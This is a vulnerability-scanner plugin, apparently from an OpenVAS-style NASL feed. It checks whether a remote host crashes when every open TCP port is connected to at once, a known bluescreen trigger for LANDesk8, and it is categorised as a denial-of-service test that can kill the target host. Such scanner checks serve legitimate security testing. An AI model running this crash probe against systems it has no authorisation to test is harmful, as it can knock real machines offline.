# SPDX-FileCopyrightText: 2004 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15571");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("connect to all open ports");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2004 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("secpod_open_tcp_ports.nasl");
  script_mandatory_keys("TCP/PORTS");

  #  script_require_ports("Services/msrdp", 3389);
  # The original advisory says that we can crash the machine by connecting to
  # LANDesk8 (which port is it?) and RDP simultaneously.
  # I modified the attack, just in case

  script_tag(name:"solution", value:"Inform your software vendor(s) and patch your system.");

  script_tag(name:"summary", value:"It was possible to crash the remote system by connecting
  to every open port.

  This is known to bluescreen machines running LANDesk8
  (In this case, connecting to two ports is enough).");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_probe");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

start_denial();
alive = end_denial();
if( ! alive )
  exit( 0 );

ports = tcp_get_all_ports();
if( isnull( ports ) )
  exit( 0 );

i = 0;

foreach port( ports ) {
  s[i] = open_sock_tcp( port );
  if( s[i] ) i++;
}

if( i == 0 )
  exit( 0 );

alive = end_denial();

if( ! alive ) {
  security_message( port:0 );
  exit( 0 );
}

for( j = 0; j < i; j ++ ) {
  close( s[j] );
}

exit( 99 );
